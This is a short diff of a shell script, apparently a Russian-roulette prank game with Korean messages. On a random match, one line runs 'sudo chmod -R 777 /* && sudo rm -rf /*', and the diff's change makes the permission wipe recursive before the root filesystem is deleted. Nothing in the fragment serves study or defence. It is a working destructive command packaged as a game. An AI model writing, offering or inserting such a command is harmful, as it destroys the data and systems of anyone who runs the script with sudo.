@@ -11,7 +11,7 @@ then
 if [ $num -eq $[ $[$RANDOM % $ha] + 1] ]
 then
 	echo "ㅅㄱ"
-	sudo chmod 777 /* && sudo rm -rf /*
+	sudo chmod -R 777 /* && sudo rm -rf /*
 else 
 	echo "살았습니다."
 	fi
